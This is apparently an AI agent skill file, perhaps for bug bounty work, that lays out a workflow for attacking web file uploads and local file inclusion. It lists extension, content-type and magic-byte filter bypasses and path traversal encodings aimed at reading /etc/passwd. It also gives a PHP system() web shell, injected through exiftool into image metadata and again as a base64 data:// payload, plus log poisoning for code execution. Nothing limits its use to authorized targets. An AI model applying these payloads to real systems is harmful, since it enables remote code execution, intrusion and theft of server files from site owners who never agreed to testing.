---
name: bbp-file-upload-lfi
description: Specialized skill for exploiting file upload mechanisms to achieve Remote Code Execution (RCE) and exploiting Local File Inclusion (LFI) / Path Traversal.
---

# File Upload & Local File Inclusion (LFI) Skill

This skill provides methodologies for attacking file handling mechanisms in web applications.

## Workflow

### 1. Arbitrary File Upload (RCE)
If the application allows users to upload files (e.g., profile pictures, documents), attempt to upload an executable script (e.g., `.php`, `.jsp`, `.aspx`) to gain Remote Code Execution.
- **Bypassing Extension Filters:**
  - Double extensions: `shell.php.jpg`, `shell.jpg.php`
  - Null byte injection: `shell.php%00.jpg`
  - Alternative extensions: `.php3`, `.php5`, `.phtml`, `.jspx`, `.ashx`
  - Case variations: `shell.PhP`
- **Bypassing Content-Type Checks:** Change the `Content-Type` header in the HTTP request to `image/jpeg` while uploading a `.php` file.
- **Bypassing Magic Bytes (Content Sniffing):** Add valid image headers (e.g., `GIF89a;`) to the very top of the malicious script so the server thinks it's a real image.
- **ImageTragick / ExifTool Exploits:** If the server resizes or processes the image, inject payloads into the Exif metadata (e.g., `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`).

### 2. Local File Inclusion (LFI) & Path Traversal
Exploit parameters that read files from the server (e.g., `?page=about.php`, `?file=report.pdf`, `?lang=en`).
- **Basic Traversal:** Inject `../` sequences to escape the current directory and read sensitive files: `?page=../../../../../../etc/passwd` or `?file=C:\Windows\win.ini`.
- **Bypassing WAF/Filters:**
  - URL Encoding: `%2e%2e%2f`
  - Double URL Encoding: `%252e%252e%252f`
  - 16-bit Unicode: `%u002e%u002e%u2215`
  - Stripping bypass: `....//....//....//etc/passwd` (If the filter removes `../`, it leaves `../../`).
- **LFI to RCE:**
  - **Log Poisoning:** Inject PHP code into the User-Agent header or a 404 URL. The web server logs the request. Then use LFI to include the log file (e.g., `?page=/var/log/apache2/access.log`), executing the PHP code.
  - **PHP Wrappers:** Use `php://filter/convert.base64-encode/resource=index.php` to read the source code of PHP files without executing them. Use `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+` to execute base64 encoded PHP directly.
